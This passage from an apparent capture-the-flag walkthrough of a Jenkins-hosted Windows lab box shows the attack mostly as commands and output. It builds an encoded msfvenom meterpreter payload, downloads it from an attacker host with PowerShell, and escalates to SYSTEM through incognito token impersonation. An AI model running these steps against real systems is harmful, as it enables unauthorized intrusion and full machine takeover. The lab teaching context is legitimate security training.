<p>so let&rsquo;s explore the machine a bit. If we type <strong>dir c:/</strong> we&rsquo;ll navigate to the root folder. From here we can go up into the Users folder to see what we got. We see a <strong>bruce</strong> user there. We can review each folder but for the sake of not making this write-up eternal Let&rsquo;s see what&rsquo;s inside the <strong>bruce/Desktop/</strong> folder.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>ruce<span style="color:#ae81ff">\D</span>esktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019   3:22 PM         <span style="color:#ae81ff">32</span> user.txt                          


PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>ruce<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
<span style="color:#f92672">{</span>and-we-finally-get-the-flag-value<span style="color:#f92672">}</span>

</code></pre></div><p>Well, we made it this far. We were able to exploit a Jenkins project/job and we managed to get a reverse shell successfully. With this we can mark Question #3 as completed and we can  also answer question number 4.</p>
<blockquote>
<p>As it turns out we didn&rsquo;t need any <strong>GoBuster</strong> scans. They returned nothing useful anyways. However, we still we managed to get the initial access and it never hurts to do some extra enumeration.</p>
</blockquote>
<h2 id="task-2---switching-shells">[Task 2] - Switching shells</h2>
<p>In this section we&rsquo;ll see how to leverage <strong>meterpreter</strong> to aid our privilege escalation attempts.</p>
<p>In this section there is not much to add, as the room really provides almost all you need to answer the only question asked:</p>
<blockquote>
<p>Question: What is the final size of the exe payload that you generated?</p>
</blockquote>
<p>Ok so we&rsquo;ll be using <strong>msfvenom</strong> to generate a payload.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=[</span>IP<span style="color:#f92672">]</span> LPORT<span style="color:#f92672">=[</span>PORT<span style="color:#f92672">]</span> -f exe -o <span style="color:#f92672">[</span>SHELL NAME<span style="color:#f92672">]</span>.exe
</code></pre></div><p>We need to replace <strong>[IP], [PORT] and [SHELL NAME]</strong></p>
<p>For the sake of simplicity we&rsquo;ll bake this payload on the same <strong>Shells</strong> folder where we started our local server already.</p>
<p>In my case the final <strong>msfvenom</strong> command looks like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=</span>10.13.0.34 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">6555</span> -f exe -o payload.exe
</code></pre></div><p>After running that command we get the following back:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=</span>10.13.0.34 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">6555</span> -f exe -o payload.exe
<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found <span style="color:#ae81ff">1</span> compatible encoders
Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">368</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">368</span>
Payload size: <span style="color:#ae81ff">368</span> bytes
Final size of exe file: <span style="color:#f92672">{</span>ANSWER<span style="color:#f92672">}</span> bytes
Saved as: payload.exe
</code></pre></div><p>The rest of the plan follows the same approach we already did for  [Part 1]. We&rsquo;ll create a new PowerShell command to be added to the Jenkins job but this time we don&rsquo;t need the PS script as we&rsquo;ll be using the <strong>payload.exe</strong> that we just generated so the command varies a bit.</p>
<p>In my case that command would look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell <span style="color:#e6db74">&#34;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.13.0.34:8000/payload.exe&#39;,&#39;payload.exe&#39;)&#34;</span>
</code></pre></div><p>We&rsquo;ll also need to setup a <strong>multi handler</strong> in <strong>Metasploit</strong> to listen for our <strong>payload.exe</strong> reverse shell connection.</p>
<p>In our terminal let&rsquo;s start <strong>msfconsole</strong> to fire up <strong>Metasploit</strong> and create our listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfconsole
                                                  
<span style="color:#75715e"># cowsay++</span>
 ____________
&lt; metasploit &gt;
 ------------
       <span style="color:#ae81ff">\ </span>  ,__,
        <span style="color:#ae81ff">\ </span> <span style="color:#f92672">(</span>oo<span style="color:#f92672">)</span>____
           <span style="color:#f92672">(</span>__<span style="color:#f92672">)</span>    <span style="color:#f92672">)</span><span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>              <span style="color:#f92672">||</span>--<span style="color:#f92672">||</span> *


       <span style="color:#f92672">=[</span> metasploit v5.0.101-dev                         <span style="color:#f92672">]</span>
+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">2049</span> exploits - <span style="color:#ae81ff">1108</span> auxiliary - <span style="color:#ae81ff">344</span> post       <span style="color:#f92672">]</span>
+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">562</span> payloads - <span style="color:#ae81ff">45</span> encoders - <span style="color:#ae81ff">10</span> nops            <span style="color:#f92672">]</span>
+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">7</span> evasion                                       <span style="color:#f92672">]</span>

Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services

msf5 &gt; 

</code></pre></div><p>Here you can type <strong>search multi handler</strong> to locate the exploit we need and <strong>show payloads</strong> to select the right payload for it. For simplicity these are the right ones to use as instructed by the room itself:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use exploit/multi/handler
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload generic/shell_reverse_tcp
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; 
</code></pre></div><p>Then we select the right payload:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; 
</code></pre></div><p>Now you can type in <strong>show options</strong> to see which options are required for us to set, in order to run the exploit.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; show options

Module options <span style="color:#f92672">(</span>exploit/multi/handler<span style="color:#f92672">)</span>:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
   LHOST                      yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   <span style="color:#ae81ff">0</span>   Wildcard Target

</code></pre></div><p>As we can see, we just need to set <strong>[LHOST]</strong> and <strong>[LPORT]</strong> to the right values, let&rsquo;s do that.  And type in <strong>exploit</strong> or <strong>run</strong> to start our <strong>Metasploit listener/handler</strong>.</p>
<blockquote>
<p>Make sure to set the <strong>[LPORT]</strong> to the port you specified when creating the <strong>payload.exe</strong> with <strong>msfvenom</strong>.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LHOST 10.13.0.34
LHOST <span style="color:#f92672">=</span>&gt; 10.13.0.34
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">6555</span>
LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">6555</span>
msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.13.0.34:6555 
</code></pre></div><p>Now let&rsquo;s update that Jenkins Job build command with our payload.</p>
<p><img src="https://i.imgur.com/varPI6i.png" alt="we paste our new PS command to load our new payload">
Save the changes and again, trigger a new build as we did before. But unlike the previous deployed build in this case the exploit will just upload our payload to the server and we&rsquo;ll use our existing reverse shell from [Task 1] to execute it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project&gt;dir


Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Program Files (x86)\Jenkins\workspace\project


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         8/16/2020   3<span style="color:#960050;background-color:#1e0010">:</span>17 PM      73802 payload.exe     
</code></pre></div><p>We can see our payload got uploaded correctly. Let&rsquo;s run it now.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project&gt;Start-Process <span style="color:#e6db74">&#34;payload.exe&#34;</span>   
</code></pre></div><p>Once our payload runs, we see our <strong>meterpreter</strong> session gets created:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; exploit

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.13.0.34:6555 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">176195</span> bytes<span style="color:#f92672">)</span> to 10.10.177.5
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.13.0.34:6555 -&gt; 10.10.177.5:49213<span style="color:#f92672">)</span> at 2020-08-16 18:32:18 -0400

meterpreter &gt; 

</code></pre></div><p>We successfully switched from a basic shell to a <strong>meterpreter</strong> shell. This concludes [Task 2].</p>
<h2 id="task-3---privilege-escalation">[Task 3] - Privilege Escalation</h2>
<p>To solve this last task we&rsquo;ll have to leverage the <strong>token impersonation</strong> technique. The room itself goes into a bit of detail of what it is and how it works. Let&rsquo;s just skip to how to exploit it before this write-up gets any longer.</p>
<p>We need to use the <strong>whoami /priv</strong> command to see the permissions we have for the user <strong>bruce</strong>. Let&rsquo;s run that command in our reverse shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\p</span>roject&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
<span style="color:#f92672">===============================</span> <span style="color:#f92672">=========================================</span> <span style="color:#f92672">========</span>
SeIncreaseQuotaPrivilege        Adjust memory quotas <span style="color:#66d9ef">for</span> a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
PS C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\p</span>roject&gt; 

</code></pre></div><p>We get that <strong>SeDebugPrivilege</strong> and <strong>SeImpersonatePrivilege</strong> are <strong>Enabled.</strong> Just what we need.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">SeDebugPrivilege                Debug programs                            Enabled 
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
</code></pre></div><p>Back to our <strong>meterpreter</strong> reverse shell, let&rsquo;s load the <strong>incognito</strong> module that would let us exploit those privileges. Then we run <strong>list_tokens -g</strong> to see the available tokens.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; load incognito
Loading extension incognito...Success.
meterpreter &gt; list_tokens -g
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self <span style="color:#66d9ef">if</span> primary process token is SYSTEM

Delegation Tokens Available
<span style="color:#f92672">========================================</span>
<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>BUILTIN<span style="color:#ae81ff">\A</span>dministrators
BUILTIN<span style="color:#ae81ff">\I</span>IS_IUSRS
BUILTIN<span style="color:#ae81ff">\U</span>sers
NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users
NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication
NT AUTHORITY<span style="color:#ae81ff">\S</span>ERVICE
NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization
NT AUTHORITY<span style="color:#ae81ff">\W</span>RITE RESTRICTED
NT SERVICE<span style="color:#ae81ff">\A</span>ppHostSvc
NT SERVICE<span style="color:#ae81ff">\A</span>udioEndpointBuilder
NT SERVICE<span style="color:#ae81ff">\B</span>FE
NT SERVICE<span style="color:#ae81ff">\C</span>ertPropSvc
NT SERVICE<span style="color:#ae81ff">\C</span>scService
NT SERVICE<span style="color:#ae81ff">\D</span>nscache
NT SERVICE<span style="color:#ae81ff">\e</span>ventlog
NT SERVICE<span style="color:#ae81ff">\E</span>ventSystem
NT SERVICE<span style="color:#ae81ff">\F</span>DResPub
NT SERVICE<span style="color:#ae81ff">\i</span>phlpsvc
NT SERVICE<span style="color:#ae81ff">\L</span>anmanServer
NT SERVICE<span style="color:#ae81ff">\M</span>MCSS
NT SERVICE<span style="color:#ae81ff">\P</span>caSvc
NT SERVICE<span style="color:#ae81ff">\P</span>lugPlay
NT SERVICE<span style="color:#ae81ff">\R</span>pcEptMapper
NT SERVICE<span style="color:#ae81ff">\S</span>chedule
NT SERVICE<span style="color:#ae81ff">\S</span>ENS
NT SERVICE<span style="color:#ae81ff">\S</span>essionEnv
NT SERVICE<span style="color:#ae81ff">\S</span>pooler
NT SERVICE<span style="color:#ae81ff">\T</span>rkWks
NT SERVICE<span style="color:#ae81ff">\U</span>mRdpService
NT SERVICE<span style="color:#ae81ff">\U</span>xSms
NT SERVICE<span style="color:#ae81ff">\W</span>inDefend
NT SERVICE<span style="color:#ae81ff">\W</span>inmgmt
NT SERVICE<span style="color:#ae81ff">\W</span>Search
NT SERVICE<span style="color:#ae81ff">\w</span>uauserv

Impersonation Tokens Available
<span style="color:#f92672">========================================</span>
NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK
NT SERVICE<span style="color:#ae81ff">\A</span>udioSrv
NT SERVICE<span style="color:#ae81ff">\C</span>ryptSvc
NT SERVICE<span style="color:#ae81ff">\D</span>comLaunch
NT SERVICE<span style="color:#ae81ff">\D</span>hcp
NT SERVICE<span style="color:#ae81ff">\D</span>PS
NT SERVICE<span style="color:#ae81ff">\L</span>anmanWorkstation
NT SERVICE<span style="color:#ae81ff">\l</span>mhosts
NT SERVICE<span style="color:#ae81ff">\M</span>psSvc
NT SERVICE<span style="color:#ae81ff">\n</span>etprofm
NT SERVICE<span style="color:#ae81ff">\N</span>laSvc
NT SERVICE<span style="color:#ae81ff">\n</span>si
NT SERVICE<span style="color:#ae81ff">\P</span>olicyAgent
NT SERVICE<span style="color:#ae81ff">\P</span>ower
NT SERVICE<span style="color:#ae81ff">\S</span>hellHWDetection
NT SERVICE<span style="color:#ae81ff">\T</span>ermService
NT SERVICE<span style="color:#ae81ff">\W</span>32Time
NT SERVICE<span style="color:#ae81ff">\W</span>diServiceHost
NT SERVICE<span style="color:#ae81ff">\W</span>inHttpAutoProxySvc
NT SERVICE<span style="color:#ae81ff">\w</span>scsvc

meterpreter &gt; 
</code></pre></div><p>We can see that the token <strong>BUILTIN\Administrators</strong> is available. Let&rsquo;s impersonate that token by running the following in our <strong>meterpreter</strong> session.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; impersonate_token <span style="color:#e6db74">&#34;BUILTIN\Administrators&#34;</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self <span style="color:#66d9ef">if</span> primary process token is SYSTEM
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Delegation token available
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully impersonated user NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
meterpreter &gt; 
</code></pre></div><p>Once the impersonation is done we type another command to get the UID:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getuid
Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
</code></pre></div><p>As we can see we successfully managed to impersonate <strong>NT AUTHORITY\SYSTEM</strong>.</p>
<p>Now we can answer the room&rsquo;s question:</p>
<blockquote>
<p>Question #3: What is the output when you run the <em>getuid</em> command?</p>
</blockquote>
<p>Even though we managed to impersonate successfully, this actually won&rsquo;t allow us to fully have the permissions of a privileged  user. So, we need to fix that.</p>
<p>We can try to migrate our process to any other that is running with higher privileges, for that we&rsquo;ll use the <strong>ps</strong> command to get the list of running processes and identify one that suits our needs and finally <strong>migrate PID</strong> to migrate to such process.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; ps

Process List
<span style="color:#f92672">============</span>

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#f92672">[</span>System Process<span style="color:#f92672">]</span>                                                   
 <span style="color:#ae81ff">4</span>     <span style="color:#ae81ff">0</span>     System                x64   <span style="color:#ae81ff">0</span>                                      
 <span style="color:#ae81ff">396</span>   <span style="color:#ae81ff">4</span>     smss.exe              x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>mss.exe
 <span style="color:#ae81ff">524</span>   <span style="color:#ae81ff">516</span>   csrss.exe             x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe
 <span style="color:#ae81ff">572</span>   <span style="color:#ae81ff">564</span>   csrss.exe             x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe
 <span style="color:#ae81ff">580</span>   <span style="color:#ae81ff">516</span>   wininit.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>ininit.exe
 <span style="color:#ae81ff">608</span>   <span style="color:#ae81ff">564</span>   winlogon.exe          x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>inlogon.exe
 <span style="color:#ae81ff">668</span>   <span style="color:#ae81ff">580</span>   services.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ervices.exe
 <span style="color:#ae81ff">676</span>   <span style="color:#ae81ff">580</span>   lsass.exe             x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\l</span>sass.exe
 <span style="color:#ae81ff">684</span>   <span style="color:#ae81ff">580</span>   lsm.exe               x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\l</span>sm.exe
 <span style="color:#ae81ff">776</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">792</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">852</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">924</span>   <span style="color:#ae81ff">608</span>   LogonUI.exe           x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\L</span>ogonUI.exe
 <span style="color:#ae81ff">944</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">992</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1016</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1076</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1188</span>  <span style="color:#ae81ff">668</span>   spoolsv.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>poolsv.exe
 <span style="color:#ae81ff">1220</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1236</span>  <span style="color:#ae81ff">524</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe
 <span style="color:#ae81ff">1328</span>  <span style="color:#ae81ff">668</span>   amazon-ssm-agent.exe  x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\S</span>SM<span style="color:#ae81ff">\a</span>mazon-ssm-agent.exe
 <span style="color:#ae81ff">1436</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1480</span>  <span style="color:#ae81ff">668</span>   LiteAgent.exe         x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\X</span>entools<span style="color:#ae81ff">\L</span>iteAgent.exe
 <span style="color:#ae81ff">1508</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1612</span>  <span style="color:#ae81ff">2160</span>  powershell.exe        x86   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWOW64<span style="color:#ae81ff">\W</span>indowsPowerShell<span style="color:#ae81ff">\v</span>1.0<span style="color:#ae81ff">\p</span>owershell.exe
